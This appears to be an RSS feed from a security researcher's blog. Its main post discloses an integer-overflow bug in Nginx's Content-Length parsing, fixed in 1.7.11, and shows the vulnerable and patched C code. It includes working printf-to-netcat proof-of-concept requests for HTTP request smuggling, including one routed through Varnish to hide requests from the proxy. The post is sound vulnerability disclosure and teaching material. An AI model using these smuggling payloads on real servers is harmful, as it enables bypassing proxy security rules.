<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title>RBleug</title>
		<description>Regilero's blog; Mostly tech things about web stuff.</description>
		<link>http://regilero.github.io</link>
		
			<item>
				<title>Nginx Integer Truncation</title>
				<description>&lt;p&gt;&lt;small&gt; &lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://makina-corpus.com/blog/metier/2015/debordement-dentiers-dans-nginx-fixe-en-1-7-11&quot;&gt;makina corpus&lt;/a&gt;.)&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;Nginx 1.7.11&lt;/h2&gt;

&lt;p&gt;A new 1.7.11 version of Nginx has just been released (24-03-2015) and if you look at the &lt;a href=&quot;http://nginx.org/en/CHANGES&quot;&gt;CHANGES file&lt;/a&gt; you can see this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    *) Bugfix: in integer overflow handling.
           Thanks to Régis Leroy.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;yes, that's me :-), the code diff is visible in &lt;a href=&quot;http://hg.nginx.org/nginx/rev/15a15f6ae3a2&quot;&gt;mercurial, here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The real fix committed is better than the one I originally submitted. But the interesting fact is that this was an &lt;strong&gt;integer overflow bug&lt;/strong&gt;. I do not think I were the first one to report this problem as, for example, on the openBSD httpd project documents like &lt;a href=&quot;http://www.openbsd.org/papers/httpd-asiabsdcon2015.pdf&quot;&gt;this one&lt;/a&gt; we can read:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;It turned out that nginx uses many calls with the idiom malloc(num * size) and does not attempt to detect integer overflows (...)&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Starting from this 1.7.11 version things should be better, but for all previous versions this could be used to make nasty things. To be honest I did not found any big issue exploiting it, but at least I've found one way of using it with the Content-Length HTTP header.&lt;/p&gt;

&lt;h2&gt;For the record&lt;/h2&gt;

&lt;p&gt;I'm currently working on my spare time around several HTTP Smuggling tricks, searching for differences between web servers in the way they manage badly formatted HTTP. I'll made some reports of my findings later. To make it short, HTTP Smuggling attacks are based on hidden http queries, ways to hide full or partial http requests from some http agents in a chain, it can be used for cache poisoning, DOS or security bypass.&lt;/p&gt;

&lt;p&gt;Anyway I was trying a set of bad-formatted http queries against Nginx, it was quite late -- well it was very late, something like 02:00 --. I should have been sleeping, and I was in fact starting to sleep on my keyboard.&lt;/p&gt;

&lt;p&gt;I was trying to send requests with &lt;em&gt;simple&lt;/em&gt; oneliners, on the command line, this way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'POST /foo.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012Content-Type: application/x-www-form-urlencoded\015\012Content-Length : 15\015\012Content-Length:104\015\012\015\012GET /fic3.html?GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012GET /fic1.html HTTP/1.1\015\012Host: www.dummy-host.example.com\015\012\015\012'| netcat 127.0.0.1 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This one is rejected because it contains two Content-Length headers. Rejecting such requests is the base protection against HTTP smuggling.&lt;/p&gt;

&lt;p&gt;Sleeping with a finger on the keyboard key '0', I ended-up sending that query (which is in fact only one query) -- if you wonder what are &lt;code&gt;\015&lt;/code&gt; and &lt;code&gt;\012&lt;/code&gt; they are the CR-CarriageReturn (\r) and LF-LineFeed (\n) ascii character, HTTP is like windows, it works with CRLF end of lines.--. I explode the oneliner on several lines for better readability:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'GET /fic1.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length:90000000000000000000000000000000000000000000000000000000000000015 \015\012'\
'\015\012123456789012345'\
'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'| netcat 127.0.0.1 80
----------------
HTTP/1.1 200 OK
Server: nginx/1.2.1
Date: Sat, 28 Feb 2015 18:22:18 GMT
Content-Type: text/html
Content-Length: 41
Last-Modified: Sun, 08 Feb 2015 23:51:13 GMT
Connection: keep-alive
Accept-Ranges: bytes

&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H1&amp;gt;FIRST&amp;lt;/H1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
HTTP/1.1 200 OK
Server: nginx/1.2.1
Date: Sat, 28 Feb 2015 18:22:18 GMT
Content-Type: text/html
Content-Length: 42
Last-Modified: Sun, 08 Feb 2015 23:51:33 GMT
Connection: keep-alive
Accept-Ranges: bytes

&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;H1&amp;gt;SECOND&amp;lt;/H1&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nginx responded to that query, it did not send me a &quot;413&quot; response, and I was awake enough to realize it. I have two valid responses for 1 single query.&lt;/p&gt;

&lt;p&gt;With a shorter Content-length you have the right behavior (an error 413):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'GET /fic1.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length:90000015 \015\012'\
'\015\012123456789012345'\
'GET http://www.dummy-host.example.com/fic2.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'| netcat 127.0.0.1 80
-----------
HTTP/1.1 413 Request Entity Too Large
Server: nginx/1.2.1
Date: Wed, 25 Mar 2015 17:39:49 GMT
Content-Type: text/html
Content-Length: 198
Connection: close

&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;413 Request Entity Too Large&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;413 Request Entity Too Large&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.2.1&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The request sent is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1 - GET /fic1.html HTTP/1.1[CR][LF]
2 - Host: www.dummy-host.example.com[CR][LF]
3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
4 - Content-Length:900000000000000000000000000000000000000000000000000000015 [CR][LF]
5 - [CR][LF]
6 - 123456789012345GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
7 - Host: www.dummy-host.example.com[CR][LF]
8 - [CR][LF]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a GET request containing a Body (line 6 to 8) (something unusual, usually only POST queries should send body parts). The fact we have two responses for this request means Nginx is reading this request like a pipeline of two or more requests, this way:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Request 1: a GET query with a body of size 15
1 - GET /fic1.html HTTP/1.1[CR][LF]
2 - Host: www.dummy-host.example.com[CR][LF]
3 - Content-Type: application/x-www-form-urlencoded[CR][LF]
4 - Content-Length: 15 [CR][LF]
5 - [CR][LF]
6 - 123456789012345 #&amp;lt;----------- this is 15 bytes
# Request 2: another request
6 - GET http://www.dummy-host.example.com/fic2.html HTTP/1.1[CR][LF]
7 - Host: www.dummy-host.example.com[CR][LF]
8 - [CR][LF]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;Integer Overflow truncation&lt;/h2&gt;

&lt;p&gt;We have this 900000000000000000000000000000000000000000000000000000015 read as 15, this is usually an integer overflow bug.
A bunch of functions in nginx could lead to such overflows, &lt;code&gt;ngx_atoi&lt;/code&gt;, &lt;code&gt;ngx_atofp&lt;/code&gt;, &lt;code&gt;ngx_atosz&lt;/code&gt;, &lt;code&gt;ngx_atoof&lt;/code&gt;, &lt;code&gt;ngx_atotm&lt;/code&gt; and &lt;code&gt;ngx_hextoi&lt;/code&gt;.
If I remember well, the one used for the Content-Length header parsing is &lt;code&gt;ngx_atosz&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let's analyze one of the functions before the fix:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The goal is to transform a text containing a number, like &quot;15&quot; to a number, 15. &lt;code&gt;line&lt;/code&gt; contains the string and &lt;code&gt;n&lt;/code&gt; is the string length. The &lt;code&gt;(*line &amp;lt; '0' || *line &amp;gt; '9')&lt;/code&gt; test ensure each character of the line is really a digit.&lt;/p&gt;

&lt;p&gt;For each character the final number is computed by doing a &lt;code&gt;* 10&lt;/code&gt; with the previous compute value and then adding the digit.&lt;/p&gt;

&lt;p&gt;But with long strings of digits, comes a time when doing a &lt;code&gt;* 10&lt;/code&gt; in the C code makes your number smaller, because you hit the maximum value, with signed integers your result is at first a negative integer. When you'll hit the limit a second time you may end up with short positive values, and loop on the allowed ranges, or maybe not, the behavior is &lt;strong&gt;unknown&lt;/strong&gt;, it depends on the compiler, the OS, etc.&lt;/p&gt;

&lt;p&gt;On my own tests, one a local server, I was able to obtain a 15 quite easily with a string number containing a lot of '0' -- like the thing obtained by accident--. I don't really know why. somewhere in the loop &lt;code&gt;value&lt;/code&gt; comes to 0, one thing is sure, when you bypass the limits strange things happens.&lt;/p&gt;

&lt;p&gt;Remember that the final result may depend on your architecture:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;request Content-length / parsed Content Length
'10'                   =&amp;gt; 10
'9224000000000000000'  =&amp;gt; -9222744073709551616
'36893488147419103231' =&amp;gt; -1
'36893488147419103232' =&amp;gt; 0
'36893488147419103233' =&amp;gt; 1
'36893488147419103247' =&amp;gt; 15
'368934881474191032320000000000015' =&amp;gt; 15
'3689348814741910323200000000000000000015' =&amp;gt; 15
'36893488147419104005' =&amp;gt; 773
'36893488147420000005' =&amp;gt; 896773
'90000000000000000000000000000000000000000000000000000' =&amp;gt; -5507902344274116608
'900000000000000000000000000000000000000000000000000000' =&amp;gt; 261208778387488768
'9000000000000000000000000000000000000000000000000000000' =&amp;gt; 2612087783874887680
'90000000000000000000000000000000000000000000000000000000' =&amp;gt; 7674133765039325184
'900000000000000000000000000000000000000000000000000000000' =&amp;gt; 2954361355555045376
'9000000000000000000000000000000000000000000000000000000000' =&amp;gt; -7349874591868649472
'90000000000000000000000000000000000000000000000000000000000' =&amp;gt; 288230376151711744
'900000000000000000000000000000000000000000000000000000000000000' =&amp;gt; 4611686018427387904
'9000000000000000000000000000000000000000000000000000000000000000' =&amp;gt; -9223372036854775808
'9999999999999999999999999999999999999999999991000000000000000000' =&amp;gt; -9000000000000000000
'9999999999999999999999999999999999999999999999900000000000000000' =&amp;gt; -100000000000000000
'9999999999999999999999999999999999999999999999990000000000000000' =&amp;gt; -10000000000000000
'9999999999999999999999999999999999999999999999999999999999999990' =&amp;gt; -10
'90000000000000000000000000000000000000000000000000000000000000000' =&amp;gt; 0
'90000000000000000000000000000000000000000000000000000000000000015' =&amp;gt; 15
'900000000000000000000000000000000000000000000000000000000000000000000000015' =&amp;gt; 15
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The fixed version of this same function (my own proposal was a return as soon as &lt;code&gt;value&lt;/code&gt; was lower than previous value in the for loop):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Example of exploitation Varnish + Nginx&lt;/h2&gt;

&lt;p&gt;To exploit this integer truncation we have to send a very-very-very big content-length header, so big that we cannot really send such a big query (for example 36893488147419103232, the first 0, is 32 768 Petabytes); and we need to get the request body transferred to nginx without a buffering proxy (because we cannot wait for a full request buffering, we need the proxy to send the request to nginx while still receiving inputs). This can be done using Varnish (at least, they may be others). An Apache mod_proxy server would reject such a big Content-Length header, but not Varnish.&lt;/p&gt;

&lt;p&gt;We need a proxy because the basics of an HTTP Smuggling attack is precisely to have differences in the interpretation of the request by two actors, here the varnish proxy as first actor and the Nginx backend as the second one.&lt;/p&gt;

&lt;p&gt;Now when Nginx will receive this request from the Varnish proxy it will read a completely different and shorter Content-Length Header, and this means we can hide new HTTP requests in the transferred request body. Something than the proxy did not saw as a request.&lt;/p&gt;

&lt;p&gt;Note that we will never receive the results from that hidden query, and that we will have to close the initial query (because the number of bytes to transfer is too high). So there is no way of poisoning the reverse proxy cache (here Varnish). The only usage of such exploit is to bypass security rules that could be written in Varnish and forgotten in Nginx and use that to send a request where the result as no importance. A good defense in depth policy would enforce rewriting in Nginx security rules defined in the proxy, but if it is not the case this technique could be used to &lt;strong&gt;transfer a blind unfiltered request to Nginx&lt;/strong&gt; (blind because you will never get the response).&lt;/p&gt;

&lt;p&gt;This is the reason why this issue is not considered &quot;serious&quot; by the Nginx project. Alone this flaw is not very useful... but mighty oaks from little acorns grow.&lt;/p&gt;

&lt;p&gt;You could try something like that (here with varnish on port 8080 on 127.0.0.1, with nginx as a backend, and with a POST query containing two hidden queries in the body), try it only at home:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'POST /could_fail.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-length: 9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000015\015\012'\
'\015\012123456789012345GET /hidden.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'\
'POST /could_fail.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length: 1048570\015\012'\
'etc..aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
'(... here a quite long filler, something like 500 characters at least because we need varnish'\
'to start transmission of the body and this requires some inputs...)aaaaaaaaaaaaaaaaaaaaaaaaaaa'\
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'| netcat 127.0.0.1 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can try it with a wireshark and see that Nginx respond to all the queries (or you can check the access logs).&lt;/p&gt;

&lt;p&gt;I did not found any malloc error associated with theses integers overflows, but you are free to search that.&lt;/p&gt;

&lt;p&gt;My own conclusion would be: C, how is this still a thing :-)&lt;/p&gt;

&lt;p&gt;More seriously I find distressing that most web servers are still sensitive to low-level C errors like integer overflows, null strings, etc.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2015-03-25 00:00:00 +0100</published>
				<link>http://regilero.github.io/security/english/2015/03/25/nginx-integer_truncation/</link>
			</item>
		
			<item>
				<title>AirPair, Drupal with PHP-FPM, Apache or Nginx</title>
				<description>&lt;h2&gt;AirPair&lt;/h2&gt;

&lt;p&gt;In the pasts I've made some detailled posts about php-fpm for Drupal7 with Apache 2.2. Now you have the Apache 2.4 version which is easier to use with php-fpm. And if you do the things the right way it's also easy to replace Apache with Nginx.&lt;/p&gt;

&lt;p&gt;I made two posts on AirPair to explain all theses things quite deeply:(I apologize for the total lack of humility in the titles):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.airpair.com/nginx/posts/ultimate-guide-migrating-apache-to-nginx-1&quot;&gt;The Ultimate Guide to Migrating From Apache to Nginx: Part 1&lt;/a&gt; which covers the basics, php-fpm and Apache 2.4&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.airpair.com/nginx/posts/ultimate-guide-migrating-apache-to-nginx-2&quot;&gt;The Ultimate Guide to Migrating From Apache to Nginx: Part 2&lt;/a&gt; which covers Nginx&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;That's all.&lt;/p&gt;

&lt;ul&gt;
